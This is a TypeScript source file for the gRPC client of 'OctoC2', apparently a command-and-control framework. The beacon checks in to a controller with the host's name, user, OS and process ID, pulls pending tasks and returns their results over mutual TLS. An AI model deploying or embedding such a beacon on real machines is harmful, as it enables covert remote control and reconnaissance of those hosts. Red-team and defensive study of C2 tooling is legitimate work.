/**
 * OctoC2 — BeaconGrpcClient
 *
 * Wraps a mutually authenticated @grpc/grpc-js channel for BeaconService.
 * The generated shared proto definition is parsed in memory so compiled
 * beacons do not depend on writable temporary files.
 */

import * as grpc        from "@grpc/grpc-js";
import * as protoLoader from "@grpc/proto-loader";
import * as protobuf    from "protobufjs";
import { PROTO_DEFINITION }  from "@octoc2/shared/proto";

// ── Internal proto types (keepCase:false → camelCase field names) ─────────────

interface CheckinReq {
  beaconId:  string;
  publicKey: string;
  hostname:  string;
  username:  string;
  os:        string;
  arch:      string;
  pid:       number;
  checkinAt: string;
  identityEnvelope: string;
}

interface ProtoTask {
  id:       string;
  kind:     string;
  argsJson: string;
  issuedAt: string;
}

interface CheckinResp {
  pendingTasks: ProtoTask[];
}

interface SubmitResultReq {
  result: {
    taskId:      string;
    beaconId:    string;
    success:     boolean;
    output:      string;
    data:        string;
    completedAt: string;
    signature:   string;
    metadataJson: string;
    hasData:      boolean;
  };
}

interface SubmitResultResp {
  accepted: boolean;
  message:  string;
}

// Dynamically-loaded service stub — typed minimally
interface BeaconServiceStub extends grpc.Client {
  checkin(
    req:      CheckinReq,
    meta:     grpc.Metadata,
    opts:     grpc.CallOptions,
    callback: (err: grpc.ServiceError | null, res: CheckinResp) => void
  ): grpc.ClientUnaryCall;
  submitResult(
    req:      SubmitResultReq,
    meta:     grpc.Metadata,
    opts:     grpc.CallOptions,
    callback: (err: grpc.ServiceError | null, res: SubmitResultResp) => void
  ): grpc.ClientUnaryCall;
}

// ── BeaconGrpcClient ───────────────────────────────────────────────────────────

export class BeaconGrpcClient {
  private stub: BeaconServiceStub | null = null;

  constructor(
    private readonly bearerToken: string,
    private readonly tls: {
      rootCerts: Buffer;
      privateKey: Buffer;
      certChain: Buffer;
    },
  ) {
    if (!bearerToken) throw new Error("gRPC bearer token is required");
  }

  private metadata(): grpc.Metadata {
    const metadata = new grpc.Metadata();
    metadata.set("authorization", `Bearer ${this.bearerToken}`);
    return metadata;
  }

  // ── connect ──────────────────────────────────────────────────────────────────

  async connect(address: string): Promise<void> {
    // Parse the proto definition in-memory to avoid protobufjs's file-fetch path.
    // In Bun compiled binaries, Bun defines XMLHttpRequest globally (web API compat)
    // so protobufjs picks the XHR path for async loads, and util.fs is null for sync
    // loads — both fail on local file paths. Parsing from string avoids all file I/O.
    const root = protobuf.parse(PROTO_DEFINITION).root;
    root.resolveAll();
    const packageDef = protoLoader.fromJSON(root.toJSON(), {
      keepCase:  false,
      longs:     String,
      enums:     String,
      defaults:  true,
      oneofs:    true,
    });

    const proto = grpc.loadPackageDefinition(packageDef) as Record<string, unknown>;
    const pkg   = proto["svc"] as Record<string, grpc.ServiceClientConstructor>;
    const BeaconService = pkg["BeaconService"];
    if (!BeaconService) throw new Error("gRPC package definition missing BeaconService");

    // Strip an HTTPS scheme for grpc-js. Plain HTTP is never accepted.
    let target: string;
    if (address.startsWith("https://")) {
      const url = new URL(address);
      target = `${url.hostname}:${url.port || "443"}`;
    } else if (address.startsWith("http://")) {
      throw new Error("insecure gRPC URLs are not permitted");
    } else {
      target = address;
    }
    const creds = grpc.credentials.createSsl(
      this.tls.rootCerts,
      this.tls.privateKey,
      this.tls.certChain,
    );

    this.stub = new BeaconService(target, creds) as unknown as BeaconServiceStub;
  }

  // ── checkin ──────────────────────────────────────────────────────────────────

  checkin(req: CheckinReq): Promise<CheckinResp> {
    return new Promise((resolve, reject) => {
      const opts: grpc.CallOptions = { deadline: new Date(Date.now() + 30_000) };
      this.stub!.checkin(req, this.metadata(), opts, (err, res) => {
        if (err) return reject(err);
        resolve(res);
      });
    });
  }

  // ── submitResult ─────────────────────────────────────────────────────────────

  submitResult(req: SubmitResultReq): Promise<SubmitResultResp> {
    return new Promise((resolve, reject) => {
      const opts: grpc.CallOptions = { deadline: new Date(Date.now() + 30_000) };
      this.stub!.submitResult(req, this.metadata(), opts, (err, res) => {
        if (err) return reject(err);
        resolve(res);
      });
    });
  }

  // ── close ─────────────────────────────────────────────────────────────────────

  close(): void {
    if (this.stub) {
      (this.stub as unknown as grpc.Client).close();
      this.stub = null;
    }
  }
}
